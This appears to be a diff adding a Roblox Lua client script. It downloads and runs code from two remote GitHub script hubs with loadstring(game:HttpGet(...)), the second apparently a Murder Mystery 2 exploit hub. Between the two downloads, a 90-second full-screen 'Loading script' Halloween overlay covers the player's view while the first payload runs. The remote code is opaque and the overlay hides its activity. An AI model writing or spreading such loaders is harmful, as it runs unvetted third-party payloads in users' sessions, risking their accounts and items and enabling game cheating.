@@ -1,0 +1,94 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- === ШАГ 1: Первый твой скрипт ===
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/vertix-hub/Script-Hub/refs/heads/main/Menu"))()
+end)
+
+-- === ШАГ 2: Halloween Loading Screen ===
+local loadTime = 90
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "HalloweenLoading"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.DisplayOrder = 999999
+gui.Parent = playerGui
+
+-- Фон с градиентом
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(30,10,35)
+bg.BorderSizePixel = 0
+local gradient = Instance.new("UIGradient", bg)
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(110,20,160)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,120,50))
+}
+gradient.Rotation = 45
+
+-- Текст
+local label = Instance.new("TextLabel", gui)
+label.AnchorPoint = Vector2.new(0.5,0.5)
+label.Position = UDim2.new(0.5,0,0.45,0)
+label.Size = UDim2.new(0,400,0,60)
+label.BackgroundTransparency = 1
+label.Text = "Loading script"
+label.TextColor3 = Color3.fromRGB(255,200,150)
+label.Font = Enum.Font.GothamBold
+label.TextSize = 34
+label.TextStrokeTransparency = 0.7
+
+-- Полоса загрузки
+local barHolder = Instance.new("Frame", gui)
+barHolder.AnchorPoint = Vector2.new(0.5,0.5)
+barHolder.Position = UDim2.new(0.5,0,0.55,0)
+barHolder.Size = UDim2.new(0.6,0,0,28)
+barHolder.BackgroundColor3 = Color3.fromRGB(40,15,10)
+barHolder.BorderSizePixel = 0
+local hCorner = Instance.new("UICorner", barHolder)
+hCorner.CornerRadius = UDim.new(0,14)
+
+local bar = Instance.new("Frame", barHolder)
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(255,120,40)
+bar.BorderSizePixel = 0
+local bCorner = Instance.new("UICorner", bar)
+bCorner.CornerRadius = UDim.new(0,14)
+
+local barGrad = Instance.new("UIGradient", bar)
+barGrad.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,140,50)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,190,80)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,100,30))
+}
+barGrad.Rotation = 0
+
+-- Анимация точек
+task.spawn(function()
+    local dots = 0
+    while gui.Parent do
+        dots = (dots + 1) % 4
+        label.Text = "Loading script" .. string.rep(".", dots)
+        task.wait(0.5)
+    end
+end)
+
+-- Анимация заполнения полосы
+local startTime = tick()
+while tick() - startTime < loadTime do
+    local progress = math.clamp((tick()-startTime)/loadTime,0,1)
+    bar.Size = UDim2.new(progress,0,1,0)
+    task.wait(0.05)
+end
+
+-- Убираем GUI
+gui:Destroy()
+
+-- === ШАГ 3: Второй твой скрипт ===
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsForMM2RewHub/RewHub/refs/heads/main/LoaderRewHub.lua"))()
+end)
